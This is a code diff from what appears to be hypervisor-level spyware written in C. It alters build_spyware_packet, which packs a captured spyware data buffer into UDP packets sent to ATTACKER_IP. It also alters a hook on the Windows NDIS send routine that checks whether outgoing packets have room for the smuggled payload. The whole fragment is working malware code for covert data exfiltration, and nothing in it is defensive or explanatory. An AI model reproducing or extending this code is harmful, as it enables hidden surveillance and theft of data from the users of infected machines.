@@ -75,10 +75,10 @@ void build_spyware_packet(byte_t *pkt){
     ip_t *ip_hdr = eth_hdr->payload;
     udp_t *udp_hdr = ip_hdr->payload;
     build_ethernet(pkt, shared_cores_data.router_mac, "IP");
-    build_ip(ip_hdr, sizeof(udp_t)+2+shared_cores_data.spyware_data_buffer.length, ATTACKER_IP);
-    *(uint16_t*)(udp_hdr->payload) = shared_cores_data.spyware_data_buffer.length;
-    memcpy(udp_hdr->payload+2, shared_cores_data.spyware_data_buffer.chars, shared_cores_data.spyware_data_buffer.length);
-    build_udp(udp_hdr, SRC_PORT, DST_PORT, ip_hdr, 2+shared_cores_data.spyware_data_buffer.length);
+    build_ip(ip_hdr, sizeof(udp_t)+1+shared_cores_data.spyware_data_buffer.length, ATTACKER_IP);
+    *(uint8_t*)(udp_hdr->payload) = shared_cores_data.spyware_data_buffer.length;
+    memcpy(udp_hdr->payload+1, shared_cores_data.spyware_data_buffer.chars, shared_cores_data.spyware_data_buffer.length);
+    build_udp(udp_hdr, SRC_PORT, DST_PORT, ip_hdr, 1+shared_cores_data.spyware_data_buffer.length);
 
 }
 
@@ -164,7 +164,7 @@ void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
     }
 
     // Verify that packet size is enough
-    uint32_t total_packet_size = sizeof(ethernet_t)+sizeof(ip_t)+sizeof(udp_t)+2+shared_cores_data.spyware_data_buffer.length;
+    uint32_t total_packet_size = sizeof(ethernet_t)+sizeof(ip_t)+sizeof(udp_t)+1+shared_cores_data.spyware_data_buffer.length;
     if (data_length + data_offset < total_packet_size){
         // packet not big enough for some reason.
         ReleaseLock(&shared_cores_data.spyware_data_lock);
